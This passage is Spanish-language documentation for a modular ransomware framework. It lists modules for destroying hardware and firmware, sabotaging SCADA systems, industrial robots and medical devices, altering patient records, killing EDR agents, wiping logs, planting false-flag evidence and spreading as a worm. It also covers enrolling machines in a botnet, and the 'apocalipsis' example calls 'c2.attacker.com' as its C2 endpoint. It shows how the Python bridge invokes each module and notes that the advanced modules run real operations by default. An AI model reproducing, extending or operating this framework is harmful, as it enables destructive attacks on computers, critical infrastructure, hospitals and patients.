result = registry["ransomware_v28"]["emotional_encrypt"]({})
```

---

### 67. ransomware_v28.false_redemption

Falsa redencion: backdoor oculto que se reactiva despues de un supuesto descifrado exitoso.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Instala persistencia post-descifrado |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["false_redemption"]({})
```

---

## ransomware_v29 (24 modulos)

Archivo: `handlers/ransomware_v29.py`

---

### 68. ransomware_v29.hdd_firmware_destroy

Destruccion de firmware HDD: enumera discos via /dev/sd*, lee SMART, verifica ATA passthrough y capacidad de flash.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Enumera discos automaticamente |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["hdd_firmware_destroy"]({})
```

---

### 69. ransomware_v29.vrm_overvoltage

Sobrevoltaje via VRM: accede a reguladores de voltaje del CPU/DRAM via sysfs para causar dano fisico.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Lee /sys/class/hwmon |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["vrm_overvoltage"]({})
```

---

### 70. ransomware_v29.acoustic_resonance

Resonancia acustica: calcula frecuencias de resonancia de discos HDD para provocar fallos mecanicos via audio.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Calcula frecuencias basadas en RPM |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["acoustic_resonance"]({})
```

---

### 71. ransomware_v29.psu_corrupt

Corrupcion de PSU: accede al firmware de la fuente de alimentacion via IPMI/PMBus para causar inestabilidad.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Verifica interfaces IPMI/PMBus |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["psu_corrupt"]({})
```

---

### 72. ransomware_v29.usb_killer

Activacion USB killer: identifica puertos USB y envia senales de sobrecarga para destruir hardware conectado.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Enumera puertos USB activos |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["usb_killer"]({})
```

---

### 73. ransomware_v29.robot_sabotage

Sabotaje de robots industriales: calcula trayectorias erroneas para manipuladores roboticos.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca controladores ROS/KUKA/ABB |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["robot_sabotage"]({})
```

---

### 74. ransomware_v29.centrifuge_resonance

Resonancia de centrifugas: calcula frecuencia critica para provocar fallo estructural (estilo Stuxnet).

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Calculo de frecuencias criticas |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["centrifuge_resonance"]({})
```

---

### 75. ransomware_v29.ui_shell_fake

Reemplazo de shell UI: sustituye el escritorio del usuario con interfaz falsa que captura credenciales.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Genera HTML/JS de shell falso |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["ui_shell_fake"]({})
```

---

### 76. ransomware_v29.deepfake_hallucinate

Generacion de deepfakes: crea contenido audiovisual falso del objetivo para extorsion o difamacion.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Verifica modelos de IA disponibles |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["deepfake_hallucinate"]({})
```

---

### 77. ransomware_v29.network_ghosts

Fantasmas de red: crea hosts virtuales falsos en la red para confundir herramientas de inventario y SIEM.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Genera MACs y IPs fantasma |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["network_ghosts"]({})
```

---

### 78. ransomware_v29.medical_tamper

Manipulacion de registros medicos: altera datos de pacientes en sistemas accesibles (HL7/FHIR).

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca sistemas medicos en red |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["medical_tamper"]({})
```

---

### 79. ransomware_v29.intel_me_flash

Flash de Intel ME: accede al Management Engine para persistencia a nivel de chipset, invisible al SO.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Verifica acceso a Intel ME via MEI |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["intel_me_flash"]({})
```

---

### 80. ransomware_v29.smm_handler

Instalacion de handler SMM: inyecta codigo en System Management Mode para persistencia por debajo del SO.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Verifica acceso a SMRAM |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["smm_handler"]({})
```

---

### 81. ransomware_v29.microcode_corrupt

Corrupcion de microcigo: accede a MSRs del CPU para alterar actualizaciones de microcode cargadas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Lee /dev/cpu/*/msr |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["microcode_corrupt"]({})
```

---

### 82. ransomware_v29.nic_persist

Persistencia en firmware NIC: escribe payload en espacio de configuracion PCI de la tarjeta de red.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Enumera NICs via /sys/bus/pci |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["nic_persist"]({})
```

---

### 83. ransomware_v29.mft_bitmap

Sobreescritura de bitmap MFT: corrompe la tabla maestra de archivos NTFS para impedir acceso a datos.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Accede a disco raw |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["mft_bitmap"]({})
```

---

### 84. ransomware_v29.backup_prune

Poda de cadena de backups: identifica y elimina eslabones criticos en cadenas de backup incrementales.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca en /backup, /var/backups, etc. |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["backup_prune"]({})
```

---

### 85. ransomware_v29.journal_poison

Envenenamiento de journal: corrompe journals ext4/XFS/NTFS para provocar inconsistencias silenciosas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Accede a dispositivos de bloque |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["journal_poison"]({})
```

---

### 86. ransomware_v29.dns_poison

Envenenamiento de cache DNS: inyecta registros falsos en resolvers locales y archivos hosts.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Modifica /etc/hosts y cache local |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["dns_poison"]({})
```

---

### 87. ransomware_v29.bgp_phantom

Rutas BGP fantasma: inyecta rutas falsas en tabla de enrutamiento para crear blackholes de trafico.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Verifica daemons BGP locales |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["bgp_phantom"]({})
```

---

### 88. ransomware_v29.ldap_intermittent

DoS intermitente LDAP: provoca fallos aleatorios en autenticacion para generar caos sin alertar inmediatamente.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Conecta a puerto 389/636 |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["ldap_intermittent"]({})
```

---

### 89. ransomware_v29.digital_thermite

Termita digital: autodestruccion total del sistema con sobreescritura segura de todos los datos accesibles.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Destruye datos de forma irrecuperable |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["digital_thermite"]({})
```

---

### 90. ransomware_v29.honey_token

Deteccion de honey tokens: identifica trampas (canary tokens, fake credentials) para evitar alertas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Analiza credenciales y archivos sospechosos |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["honey_token"]({})
```

---

### 91. ransomware_v29.access_log_wipe

Borrado seguro de logs de acceso: sobreescribe con datos aleatorios antes de eliminar para evitar recuperacion forense.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca en /var/log, Event Viewer, etc. |

**Ejemplo:**
```python
result = registry["ransomware_v29"]["access_log_wipe"]({})
```

---

## ransomware_v210 (2 modulos)

Archivo: `handlers/ransomware_v210.py`

---

### 92. ransomware_v210.apocalipsis

Destruccion total del sistema: kill de procesos criticos, propagacion worm, enrolamiento botnet, generacion de claves post-quantum, destruccion de MBR y bricking de firmware.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `subnet` | str | `"192.168.1.0/24"` | Subred para propagacion worm |
| `c2_endpoint` | str | `"x404x-c2.online:8443"` | Endpoint C2 para botnet |

**Ejemplo:**
```python
result = registry["ransomware_v210"]["apocalipsis"]({
    "subnet": "10.0.0.0/24",
    "c2_endpoint": "c2.attacker.com:443"
})
```

---

### 93. ransomware_v210.phantom_evasion

Evasion fantasma completa: packer estatico, crypter, code caves, AMSI kill, ETW silence, NTDLL unhook, Defender disable, Hell's Gate syscalls, deteccion sandbox/VM, process hollowing, LOLBins y mutacion polimorfica.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Ejecuta todas las capas de evasion |

**Ejemplo:**
```python
result = registry["ransomware_v210"]["phantom_evasion"]({})
```

---

## ransomware_blockz (14 modulos)

Archivo: `handlers/ransomware_blockz.py`

---

### 94. ransomware_blockz.genetic_evolve

Motor de algoritmo genetico para evolucion polimorfica: evoluciona bytecode para minimizar firmas de deteccion.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `population` | int | `12` | Tamano de la poblacion |
| `generations` | int | `5` | Numero de generaciones |
| `mutation_rate` | int | `15` | Porcentaje de mutacion |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["genetic_evolve"]({
    "population": 20,
    "generations": 10,
    "mutation_rate": 25
})
```

---

### 95. ransomware_blockz.deepfake_generate

Pipeline de generacion de deepfakes: verifica modelos disponibles (Coqui TTS, Stable Diffusion) y genera contenido sintetico.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Detecta modelos de IA instalados |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["deepfake_generate"]({})
```

---

### 96. ransomware_blockz.scada_covert

Ataque SCADA encubierto: opera de forma sigilosa sobre protocolos industriales sin generar alertas en SIEM.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Escanea puertos Modbus/S7/OPC-UA |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["scada_covert"]({})
```

---

### 97. ransomware_blockz.firmware_worm

Gusano de firmware: se propaga via actualizaciones de firmware comprometidas entre dispositivos de la red.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Enumera dispositivos con firmware actualizable |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["firmware_worm"]({})
```

---

### 98. ransomware_blockz.medical_attack

Ataque a dispositivos medicos: busca equipos conectados (bombas de infusion, monitores, PACS) y altera parametros.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Escanea puertos DICOM/HL7 |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["medical_attack"]({})
```

---

### 99. ransomware_blockz.model_poison

Envenenamiento de modelos de IA: inyecta datos adversariales en modelos ML accesibles para degradar su precision.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca archivos .h5/.pt/.onnx/.pkl |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["model_poison"]({})
```

---

### 100. ransomware_blockz.disinformation

Campana de desinformacion: genera y distribuye noticias falsas sobre la empresa victima en multiples plataformas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Genera contenido via LLM si disponible |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["disinformation"]({})
```

---

### 101. ransomware_blockz.airgap_exfil

Exfiltracion air-gap: transmite datos via canales encubiertos (ultrasonido, LED, electromagnetico, termal).

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Evalua canales disponibles |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["airgap_exfil"]({})
```

---

### 102. ransomware_blockz.post_quantum

Criptografia post-quantum: genera claves Kyber-1024/Dilithium para cifrado resistente a computacion cuantica.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Genera claves con liboqs si disponible |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["post_quantum"]({})
```

---

### 103. ransomware_blockz.deadman_arm

Dead Man's Switch: arma un mecanismo que se activa automaticamente si el operador no envia heartbeat periodico.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Configura timer y acciones de destruccion |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["deadman_arm"]({})
```

---

### 104. ransomware_blockz.falseflag_plant

Plantacion de falsa bandera: inyecta artefactos de APTs conocidas (comentarios en ruso/chino, TTPs especificos) para desviar la atribucion.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Genera artefactos de APT28/Lazarus/etc. |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["falseflag_plant"]({})
```

---

### 105. ransomware_blockz.edr_kill

EDR Killer: identifica y neutraliza agentes EDR/AV (CrowdStrike, SentinelOne, Defender, Carbon Black, etc.).

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Enumera procesos EDR y aplica tecnicas de kill |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["edr_kill"]({})
```

---

### 106. ransomware_blockz.financial_crash

Sabotaje financiero: manipula datos de trading, altera registros contables y genera ordenes falsas para provocar flash crash.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca aplicaciones financieras/trading |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["financial_crash"]({})
```

---

### 107. ransomware_blockz.iot_chain

Ataque en cadena IoT: compromete un dispositivo IoT y lo usa como pivot para infectar toda la red de dispositivos conectados.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Escanea red local en busca de IoT |

**Ejemplo:**
```python
result = registry["ransomware_blockz"]["iot_chain"]({})
```

---

## Resumen por Categoria

| Categoria | Archivo | Modulos | Enfoque |
|-----------|---------|---------|---------|
| ransomware | `ransomware.py` | 9 | Cadena base: scan, encrypt, exfil, propagate |
| ransomware_advanced | `ransomware_advanced.py` | 17 | Psicologico, propagacion, infraestructura, resiliencia |
| ransomware_v26 | `ransomware_v26.py` | 8 | POMDP, IA, evasion, SMM, mobile, cloud, social C2 |
| ransomware_v27 | `ransomware_v27.py` | 10 | UEFI, hypervisor, PCIe, kernel, phishing arsenal |
| ransomware_v28 | `ransomware_v28.py` | 23 | Arsenal de malicia: IoT, social, forense, grid, bio |
| ransomware_v29 | `ransomware_v29.py` | 24 | Destruccion hardware, firmware, persistencia absoluta |
| ransomware_v210 | `ransomware_v210.py` | 2 | Apocalipsis total + evasion fantasma |
| ransomware_blockz | `ransomware_blockz.py` | 14 | Genetico, deepfake, SCADA, post-quantum, false flag |
| **TOTAL** | | **107** | |

---

## Invocacion via Bridge IPC

Desde el dispatcher Go, los modulos se invocan via el protocolo bridge:

```
Go (console) -> IPC socket -> bridge.py -> registry[category][module](params) -> JSON response
```

El bridge registra todos los handlers al iniciar:

```python
# modules/bridge/bridge.py
from handlers.ransomware import register_routes as reg_ransomware
from handlers.ransomware_advanced import register_routes as reg_advanced
from handlers.ransomware_v26 import register_routes as reg_v26
from handlers.ransomware_v27 import register_routes as reg_v27
from handlers.ransomware_v28 import register_routes as reg_v28
from handlers.ransomware_v29 import register_routes as reg_v29
from handlers.ransomware_v210 import register_routes as reg_v210
from handlers.ransomware_blockz import register_routes as reg_blockz

registry = {}
reg_ransomware(registry)
reg_advanced(registry)
reg_v26(registry)
reg_v27(registry)
reg_v28(registry)
reg_v29(registry)
reg_v210(registry)
reg_blockz(registry)
```

---

## Notas Tecnicas

- Todos los handlers devuelven un `dict` con al menos `{"success": True/False}`.
- El parametro `simulation` en modulos base controla si se realizan operaciones destructivas reales.
- Los modulos avanzados (v26+) ejecutan operaciones reales por defecto (escaneo de red, acceso a filesystem, verificacion de hardware).
- Las dependencias opcionales (`numpy`, `ollama`, `cryptography`) se verifican al importar y los handlers degradan gracefully si no estan disponibles.
- El flag `_is_root()` se verifica en modulos que requieren privilegios elevados (v29).
